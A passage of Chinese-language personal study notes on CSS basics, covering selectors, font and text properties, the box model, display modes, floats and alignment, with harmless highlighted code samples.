class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.red</span> &#123;</span><br><span class="language-css"> <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span> = <span class="hljs-string">&quot;red&quot;</span>&gt;</span>红色<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure><p>定义类：<code>.</code>+类名<br>调用类：标签内加入class = “类名”<br>长类名用<code>-</code>短横线链接<code>.star-st</code></p><h5 id="多类名"><a href="#多类名" class="headerlink" title="多类名"></a>多类名</h5><p>可以在class属性中写多个类名<br>必须用空格隔开！</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;div <span class="hljs-keyword">class</span> = &quot;<span class="hljs-symbol">red</span> <span class="hljs-symbol">green</span>&quot;&gt;&lt;/<span class="hljs-symbol">div</span>&gt;<br></code></pre></td></tr></table></figure><h5 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h5><p>html元素用id属性来调用，style中用#定义</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#pink &#123;</span><br>    color : pink;<br>&#125;<br>...<br>&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;pink&quot;</span>&gt;michell&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>与类选择器的区别：<br><strong>只能被调用一次</strong>，被第一个调用者成功调用后，无法再次被调用。</p><h5 id="通配符选择器"><a href="#通配符选择器" class="headerlink" title="通配符选择器"></a>通配符选择器</h5><p>用<code>*</code>定义，它会选取页面中所有元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>通配符选择器不需要调用，自动给所有元素使用指定的样式。</p><h4 id="CSS字体"><a href="#CSS字体" class="headerlink" title="CSS字体"></a>CSS字体</h4><p>字体系列</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-family</span>:<span class="hljs-string">&quot;Microsoft YaHei&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>字体大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>字体粗细</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-weight</span>: normal;<br>&#125;<br>有以下几个参数<br>bold：粗体 number ：<span class="hljs-number">700</span>；<br>bolder：更粗<br>lighter：细体<br>number：加数字，<span class="hljs-number">700</span>是加粗，<span class="hljs-number">400</span>是正常<br><span class="hljs-attribute">font-weight</span>: <span class="hljs-number">700</span>;<br></code></pre></td></tr></table></figure><p>文字样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-style</span>: normal;<br>&#125;<br>italic:斜体<br></code></pre></td></tr></table></figure><p>字体复合属性</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hsp">body&#123;<br>    <span class="hljs-keyword">font</span>: <span class="hljs-keyword">font</span>-style <span class="hljs-keyword">font</span>-weight <span class="hljs-keyword">font</span>-size/<span class="hljs-keyword">line</span>-height <span class="hljs-keyword">font</span>-family<span class="hljs-comment">;</span><br>    <span class="hljs-keyword">font</span>: italic <span class="hljs-number">700</span> <span class="hljs-number">16</span>px/<span class="hljs-number">20</span>px(<span class="hljs-number">20</span>px可不写) <span class="hljs-string">&#x27;microsoft yahei&#x27;</span><span class="hljs-comment">;</span><br>    不能更改顺序<br>    只有size和family不能省略，其余部分省略则取默认值。<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h4><p><strong>文本颜色</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以是16进制如：<br>#ff0000；<br>或rgb(255,0,0)；</p><p><strong>文本对齐</strong><br>text-align用于设置元素内文本内容的水平对齐方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">text-align</span> : left(默认值);<br>&#125;<br><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(默认左对齐)</span></span><br><span class="hljs-function"><span class="hljs-title">right</span><span class="hljs-params">(右对齐)</span></span><br><span class="hljs-function"><span class="hljs-title">center</span><span class="hljs-params">(居中对齐)</span></span><br></code></pre></td></tr></table></figure><p><strong>装饰文本</strong><br>text-decoration属性规定添加到文本的修饰。可以添加下划线，删除线，上划线。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">text-decoration</span>: underline;<br>&#125;<br><span class="hljs-attribute">none</span>默认<br>underline下划线<br>line-throught删除线<br>overline上划线<br></code></pre></td></tr></table></figure><p>取消链接的下划线：<br>a{<br>    text-decoration: none;<br>}<br><strong>文本缩进</strong><br>text-indent属性用于指定文本第一行的缩进。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">10px</span>;<br>&#125;<br>只缩进首行！<br></code></pre></td></tr></table></figure><p>或使用em：当前元素一个文字的大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">2em</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>行间距</strong><br>line-height属性用于设置行间的距离。<br>行间距由文本高度，上间距，下间距三者构成。<br>改变的是上、下间距。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">16px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CSS的引入方式"><a href="#CSS的引入方式" class="headerlink" title="CSS的引入方式"></a>CSS的引入方式</h4><p>按照css书写位置不同，css可以分为三大类<br><strong>内部样式表</strong><br>全部写入style标签内部<br>理论上&lt;style&gt;可以放在任意处，但一般放在head内<br>是嵌入式引用。<br><strong>行内样式表</strong><br>简单的修改：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> style = <span class="hljs-string">&quot;color : pink;&quot;</span>&gt;...&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>单个的，简单的修改。<br><strong>外部样式表</strong><br>样式单独写在style文件内，再进行调用</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">新建一个后缀名为.css的文件<br>在这个文件里面，直接写样式，不需要style标签<br>使用&lt;link&gt;标签引入到html文件里<br>&lt;link rel <span class="hljs-operator">=</span> <span class="hljs-string">&quot;stylesheet&quot;</span> href <span class="hljs-operator">=</span> <span class="hljs-string">&quot;style.css（css文件路径）&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h4 id="Emmet语法"><a href="#Emmet语法" class="headerlink" title="Emmet语法"></a>Emmet语法</h4><p>emmet语法使用缩写提高编写速度。<br>1.快速生成HTML结构语法</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">div</span>+<span class="hljs-literal">tab</span><br><span class="hljs-keyword">div</span>*<span class="hljs-number">10</span>+<span class="hljs-literal">tab</span><br>ul&gt;li*<span class="hljs-number">3</span><br><span class="hljs-keyword">div</span>+p<br>p.one(类名) == &lt;p <span class="hljs-built_in">class</span> = <span class="hljs-string">&quot;one&quot;</span>&gt;&lt;/p&gt;<br>p<span class="hljs-comment">#one(类名) == &lt;p id = &quot;one&quot;&gt;&lt;/p&gt;</span><br>即.就是生成类为此类名的元素，<span class="hljs-comment">#同理</span><br>.demo$*<span class="hljs-number">5</span>会生成以demo1~demo5为类的<span class="hljs-number">5</span>个<span class="hljs-keyword">div</span><br><span class="hljs-keyword">div</span>&#123;测试&#125; == &lt;<span class="hljs-keyword">div</span>&gt;测试&lt;/<span class="hljs-keyword">div</span>&gt;<br>$是自增符号<br><span class="hljs-keyword">div</span>&#123;$&#125;*<span class="hljs-number">5</span> == &lt;<span class="hljs-keyword">div</span>&gt;<span class="hljs-number">1</span>~<span class="hljs-number">5</span>&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>2.emmet语法快速生成css样式</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tac</span> = text-align:center<span class="hljs-comment">;</span><br><span class="hljs-attr">w100</span> = weight: <span class="hljs-number">100</span>px<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>3.快速格式化代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">vscode直接右键，选格式化文档，会自动对齐所有代码<br></code></pre></td></tr></table></figure><h4 id="css复合选择器"><a href="#css复合选择器" class="headerlink" title="css复合选择器"></a>css复合选择器</h4><p><strong>后代选择器（重要）</strong><br>后代选择器<br>例如：我想把ol内的li全部定一个样式，而ul中不变</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ol</span> <span class="hljs-selector-tag">li</span>&#123;<br>    <span class="hljs-attribute">color</span>:pink;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">元素<span class="hljs-number">1</span> 元素<span class="hljs-number">2</span>&#123;<br>    <span class="hljs-attribute">color</span>: pink;<br>&#125;<br>元素<span class="hljs-number">2</span>是元素<span class="hljs-number">1</span>后代。<br><span class="hljs-number">1</span>，<span class="hljs-number">2</span>之间用空格隔开<br>可以套很多层，但后者必须是前一个的后代<br>可以是任意基础选择器的组合<br><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">a</span>&#123;<br><span class="hljs-attribute">color</span>: yellow;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>子选择器</strong><br>子选择器只能选择某元素最近一级的子元素<br>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">元素<span class="hljs-number">1</span>&gt;元素<span class="hljs-number">2</span>&#123;<br><span class="hljs-attribute">color</span>: red;<br>&#125;<br>即只选择元素<span class="hljs-number">1</span>内离近的<span class="hljs-number">2</span>的儿子，作为对象。<br></code></pre></td></tr></table></figure><p><strong>并集选择器</strong><br>并集选择器可以选择多组标签，同时为他们定义相同样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>,<span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>: pink;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>伪类选择器</strong><br>伪类选择器书写最大的特点是用冒号<code>:</code>表示</p><p>链接伪类选择器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>  选择所有未访问过的链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>&#123;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>    <span class="hljs-attribute">text-decoration</span>: none;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span>   选择所有已被访问的链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span>&#123;<br>    <span class="hljs-attribute">color</span>: orange;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>   选择鼠标经过的那一个链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">color</span>: skyblue;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span>选择鼠标按下，但未弹起鼠标的那个链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span>&#123;<br>    <span class="hljs-attribute">color</span>: green;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>注意事项：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">为保证链接系列生效，必须保证LVHA的顺序进行声明。<br>链接都有默认样式，必须用<span class="hljs-selector-tag">a</span>单独指定样式<br>开发中：<br><span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">color</span>: grey;<br>&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">color</span>: skyblue;<br>&#125;<br>即可<br></code></pre></td></tr></table></figure><p><strong>focus伪类选择器</strong><br>用于选取获得焦点的表单元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: pink;<br>&#125;<br>则获得光标的<span class="hljs-selector-tag">input</span>元素，背景会变为pink色。<br></code></pre></td></tr></table></figure><h4 id="元素的显示模式"><a href="#元素的显示模式" class="headerlink" title="元素的显示模式"></a>元素的显示模式</h4><p>元素显示模式就是元素（标签）以什么方式进行显示</p><p>如div独占一行，但一行可以放很多span</p><p>HTML元素一般分为块元素和行内元素两种类型。</p><p><strong>块元素</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>~<span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>等等，都是块元素<br>特点：<br>霸道，独占一行<br>可以嵌套，成为容器<br>但<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>标签以及<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>系列标签主要存放文字，所以其中不能放块级元素<br>宽度默认是容器的100%<br></code></pre></td></tr></table></figure><p><strong>行内元素</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">a</span>&gt;,&lt;strong&gt;......<br>特点:<br>一行可以写多个，放在一行内显示<br>高、宽直接设置是无效的<br>默认宽度就是本身内容的宽度<br>行内元素内只能放文本或其他行内元素<br>注意：<br><span class="hljs-keyword">a</span>内不能放<span class="hljs-keyword">a</span><br><span class="hljs-keyword">a</span>内可以放块级元素。但给<span class="hljs-keyword">a</span>转换为块级模式最安全<br></code></pre></td></tr></table></figure><p><strong>行内块元素</strong><br>如img，input标签</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">特点：<br>一行内可以放多个此元素，中间会有空白空隙<br>此元素可以设置宽和高<br></code></pre></td></tr></table></figure><p><strong>元素显示模式的转换</strong><br>如：a链接增加其触发范围<br>转换为块元素:<br>display:block;<br>转换为行内元素：<br>display:inline;</p><p><strong>单行文字垂直居中</strong><br>小技巧：<br>让文字行高等于盒子的高度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<br><span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<br></code></pre></td></tr></table></figure><h3 id="CSS3列表"><a href="#CSS3列表" class="headerlink" title="CSS3列表"></a>CSS3列表</h3><p>为ul、ol设置不同的列表项标记<br><code>list-style-type</code></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>.<span class="hljs-string">a</span>&#123;<span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">circle</span>;&#125;圆点状列表标记<br>.<span class="hljs-string">b</span>&#123;<span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">square</span>;&#125;方形列表标记<br><span class="hljs-string">none</span>就是无标记<br></code></pre></td></tr></table></figure><p>也可指定图像，进行标记</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>&#123;<br>    <span class="hljs-built_in">list-style-image:</span> <span class="hljs-string">url</span>(<span class="hljs-string">&quot;a.jpg&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS3表格美化"><a href="#CSS3表格美化" class="headerlink" title="CSS3表格美化"></a>CSS3表格美化</h3><p>表格边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>, <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span><br>&#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br>此时会显示双边框，如果想只显示单边框<br><span class="hljs-attribute">border-collapse</span>: collapse;<br>即可<br></code></pre></td></tr></table></figure><p>表格高、宽、文字对齐</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">text-align</span>: right;水平方向对齐<br>    <span class="hljs-attribute">vertical-align</span>: bottom;竖直方向对齐<br>&#125;<br></code></pre></td></tr></table></figure><p>表格填充<br>控制边框和表格内容之间的间距，使用td与th元素的填充属性:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">td</span>&#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;<br>&#125;<br>会使表格更大更易于观察<br></code></pre></td></tr></table></figure><h3 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h3><p><img src="/2022/06/30/front/p3.jpg"><br><strong>Margin:外边距<br>Border:边框<br>Padding:内边距<br>Content:内容</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">25px</span> solid green;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">25px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">25px</span>;<br>    //一共是<span class="hljs-number">450px</span>的宽度<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS边框Border"><a href="#CSS边框Border" class="headerlink" title="CSS边框Border"></a>CSS边框Border</h3><p>border-style属性：<br>none：无边框<br>solid：实线边框<br>等等<br>**border-width:边框宽度<br>border-color:边框颜色<br>border-top-style:顶框样式<br>等等<br>**<br>p.one{<br>    border-style: solid;<br>    border-width: 5px;<br>    border-color: red;<br>}</p><h3 id="CSS轮廓outline"><a href="#CSS轮廓outline" class="headerlink" title="CSS轮廓outline"></a>CSS轮廓outline</h3><p>轮廓是绘制于元素周围的一条线，位于边框边缘的外围</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">outline-color</span><br><span class="hljs-attribute">outline-style</span><br><span class="hljs-attribute">outline-width</span><br></code></pre></td></tr></table></figure><h3 id="CSS外边距margin"><a href="#CSS外边距margin" class="headerlink" title="CSS外边距margin"></a>CSS外边距margin</h3><p>margin用于清除周围的元素区域。margin没有背景颜色，完全透明。</p><h3 id="CSS填充padding"><a href="#CSS填充padding" class="headerlink" title="CSS填充padding"></a>CSS填充padding</h3><p>padding设置元素内，文本内容与边框之间的距离</p><h3 id="CSS内隐藏元素"><a href="#CSS内隐藏元素" class="headerlink" title="CSS内隐藏元素"></a>CSS内隐藏元素</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden</span>&#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden1</span>&#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br>注意，前者只是看不见，但占空间<br>后者是不占空间<br></code></pre></td></tr></table></figure><h3 id="CSS定位position"><a href="#CSS定位position" class="headerlink" title="CSS定位position"></a>CSS定位position</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.p_fixed</span>&#123;<br>    <span class="hljs-attribute">position</span>: fixed;<br>&#125;<br>会使元素位置相对于浏览器窗口是固定位置<br></code></pre></td></tr></table></figure><h3 id="CSS溢出文本的处理Overflow"><a href="#CSS溢出文本的处理Overflow" class="headerlink" title="CSS溢出文本的处理Overflow"></a>CSS溢出文本的处理Overflow</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">overflow: visible元素不被修剪，呈现于元素框外面<br>overflow: hidden元素被剪掉<br>overflow：scroll（<span class="hljs-keyword">auto</span>）元素被剪掉，但可以用滚动条查看剩余内容。<br></code></pre></td></tr></table></figure><h3 id="CSS元素的浮动"><a href="#CSS元素的浮动" class="headerlink" title="CSS元素的浮动"></a>CSS元素的浮动</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span>&#123;<br>    <span class="hljs-attribute">float</span>: right;<br>&#125;<br>则该图片会显示在网页的右侧，而其余元素会包围它出现<br><br></code></pre></td></tr></table></figure><p>如：<br>这是参数为left时<br><img src="/2022/06/30/front/p4.png"><br>而以下为参数是right时<br><img src="/2022/06/30/front/p5.png"></p><h3 id="CSS对齐"><a href="#CSS对齐" class="headerlink" title="CSS对齐"></a>CSS对齐</h3><p>元素居中对齐：<br>先设置元素宽度<code>width</code>属性，再</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span>&#123;<br>    <span class="hljs-attribute">margin</span>: auto;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid red;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><span class="hljs-attribute">margin</span>: auto;即可使元素水平居中<br><span class="hljs-attribute">text-align</span>: center;<br>是文本居中<br><br></code></pre></td></tr></table></figure><p>而垂直居中，则设置行间距与高度height相等</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 